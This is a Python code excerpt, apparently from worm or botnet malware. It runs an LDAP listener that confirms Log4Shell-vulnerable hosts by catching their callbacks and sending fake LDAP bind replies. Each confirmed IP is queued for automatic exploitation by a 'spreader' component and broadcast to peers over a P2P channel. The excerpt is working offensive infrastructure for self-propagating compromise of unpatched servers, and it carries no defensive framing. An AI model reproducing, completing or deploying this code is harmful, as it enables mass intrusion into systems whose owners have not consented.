    def _start_listener(self):
        if self.listening: return
        self.listening = True
        self.last_activity = time.time()
        
        def listen():
            import socket, select
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', 0))
            self.pingback_port = s.getsockname()[1]
            s.listen(10)
            self.listener_server = s
            print(f"[LOG4J] Verifier LDAP listener started on port {self.pingback_port}")
            
            while self.listening:
                # 60s timeout watchdog
                if time.time() - self.last_activity > 60:
                    print("[LOG4J] Verifier listener timed out, shutting down")
                    break
                    
                ready = select.select([s], [], [], 1.0)
                if ready[0]:
                    try:
                        conn, addr = s.accept()
                        ip = addr[0]
                        self.last_activity = time.time()
                        
                        # Respond with valid LDAP bind success to avoid timeout
                        conn.recv(1024)
                        bind_resp = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00'
                        conn.send(bind_resp)
                        search_done = b'\x30\x0c\x02\x01\x02\x65\x07\x0a\x01\x00\x04\x00\x04\x00'
                        conn.send(search_done)
                        conn.close()
                        
                        cache_key = hashlib.md5(f"{ip}".encode()).hexdigest()
                        with self.lock:
                            if cache_key not in self.verified_targets:
                                self.verified_targets[cache_key] = {"ts": time.time(), "ip": ip}
                                self.exploit_queue.put(ip) # Queue for async exploitation
                        
                        if self.p2pmanager:
                            self.p2pmanager.broadcast("log4j_vuln_found", {"ip": ip, "ts": time.time()})
                    except Exception as e:
                        pass
                        
            self.listening = False
            s.close()
            
        def queue_worker():
            while self.listening:
                try:
                    target_ip = self.exploit_queue.get(timeout=1.0)
                    if self.spreader_ref:
                        print(f"[LOG4J] Auto-exploiting verified target: {target_ip}")
                        # Spreader will run async inside its own thread handling
                        threading.Thread(target=self.spreader_ref.exploit_target, args=(target_ip,)).start()
                except __import__('queue').Empty:
                    pass

        t = threading.Thread(target=listen, daemon=True)
        t.start()
        qw = threading.Thread(target=queue_worker, daemon=True)
        qw.start()
        time.sleep(0.5) # Wait for port bind

